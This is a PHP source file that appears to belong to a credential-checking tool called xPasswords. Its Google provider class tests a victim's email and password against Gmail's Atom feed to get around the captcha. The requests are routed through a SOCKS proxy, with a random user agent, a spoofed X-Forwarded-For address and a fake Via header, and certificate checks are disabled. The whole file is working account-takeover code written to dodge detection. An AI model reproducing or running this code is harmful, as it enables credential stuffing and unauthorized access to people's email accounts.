<?php
namespace xPasswords\Providers;

class Google {
    
    static public $imapAddress = 'imaps://imap.gmail.com:993';
    
    static public function authenticate($email, $password) {

        // Shared options
        $staticOptions = [
            'UserAgent' => \xPasswords\Core::getUserAgent(),
            'UserIP' => '78.212.' . rand(0, 255) . '.' . rand(0, 255),
            'SocksIP' => \xPasswords\Core::getProxy('Europe/France'),
        ];
        
        // Use Atom feed vulnerability to bypass the captcha
        $request = \Requests::get('https://mail.google.com/mail/feed/atom', [
            // Try to spoof and make the IP detection more complex
            'X-FORWARDED-FOR' => $staticOptions['UserIP'],
            'VIA' => '1.0 squid:80 (squid/2.1.STABLE3)',
            'User-Agent' => $staticOptions['UserAgent'],
        ], [
            'auth' => [
                $email,
                $password,
             ], // Email and password of the victim
            'timeout' => 60, // 1 min timeout
            'proxy' => $staticOptions['SocksIP'], // SOCKS Proxy
            'useragent' => $staticOptions['UserAgent'], // Random user-agent
            'follow_redirects' => false, // Don't follow redirections
            'verifyname' => false, // Do not verify SSL certificates
            'verify' => false, // Do not verify SSL certificates
        ]);

        switch($request->status_code) {
            case 200: // Authorized
            $request = NULL;
            return true;
            break;

            case 401: // Unauthorized
            $request = NULL;
            return false;
            break;

            default:
            echo \xPasswords\Core::say('[ERROR] [PROVIDER] Google returned anormal HTTP code: ' . $request->status_code . ' for ' . $email, ['color' => 'red']);
            break;
        }
        
        $request = NULL;
        return false;
    }
};